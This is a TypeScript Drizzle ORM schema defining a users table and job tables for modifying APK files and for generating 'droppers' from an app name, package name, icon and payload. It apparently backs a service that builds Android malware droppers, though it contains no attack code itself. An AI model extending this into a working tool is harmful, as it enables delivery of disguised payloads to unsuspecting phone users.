import { int, mysqlEnum, mysqlTable, text, timestamp, varchar } from "drizzle-orm/mysql-core";

/**
 * Core user table backing auth flow.
 * Extend this file with additional tables as your product grows.
 * Columns use camelCase to match both database fields and generated types.
 */
export const users = mysqlTable("users", {
  /**
   * Surrogate primary key. Auto-incremented numeric value managed by the database.
   * Use this for relations between tables.
   */
  id: int("id").autoincrement().primaryKey(),
  /** Manus OAuth identifier (openId) returned from the OAuth callback. Unique per user. */
  openId: varchar("openId", { length: 64 }).notNull().unique(),
  name: text("name"),
  email: varchar("email", { length: 320 }),
  loginMethod: varchar("loginMethod", { length: 64 }),
  role: mysqlEnum("role", ["user", "admin"]).default("user").notNull(),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
  lastSignedIn: timestamp("lastSignedIn").defaultNow().notNull(),
});

export type User = typeof users.$inferSelect;
export type InsertUser = typeof users.$inferInsert;

// TODO: Add your tables here

export const apkJobs = mysqlTable("apk_jobs", {
  id: varchar("id", { length: 64 }).primaryKey(),
  originalName: varchar("original_name", { length: 512 }).notNull(),
  status: mysqlEnum("status", ["pending", "processing", "done", "error"]).default("pending").notNull(),
  progress: int("progress").default(0).notNull(),
  logText: text("log_text"),
  originalKey: varchar("original_key", { length: 512 }),
  modifiedKey: varchar("modified_key", { length: 512 }),
  modifiedUrl: text("modified_url"),
  errorMessage: text("error_message"),
  createdAt: timestamp("created_at").defaultNow().notNull(),
  updatedAt: timestamp("updated_at").defaultNow().onUpdateNow().notNull(),
});

export type ApkJob = typeof apkJobs.$inferSelect;
export type InsertApkJob = typeof apkJobs.$inferInsert;

export const dropperJobs = mysqlTable("dropper_jobs", {
  id: varchar("id", { length: 64 }).primaryKey(),
  appName: varchar("app_name", { length: 256 }).notNull(),
  packageName: varchar("package_name", { length: 256 }),
  payloadName: varchar("payload_name", { length: 512 }).notNull(),
  status: mysqlEnum("status", ["pending", "processing", "done", "error"]).default("pending").notNull(),
  progress: int("progress").default(0).notNull(),
  logText: text("log_text"),
  payloadKey: varchar("payload_key", { length: 512 }),
  iconKey: varchar("icon_key", { length: 512 }),
  dropperKey: varchar("dropper_key", { length: 512 }),
  dropperUrl: text("dropper_url"),
  errorMessage: text("error_message"),
  createdAt: timestamp("created_at").defaultNow().notNull(),
  updatedAt: timestamp("updated_at").defaultNow().onUpdateNow().notNull(),
});

export type DropperJob = typeof dropperJobs.$inferSelect;
export type InsertDropperJob = typeof dropperJobs.$inferInsert;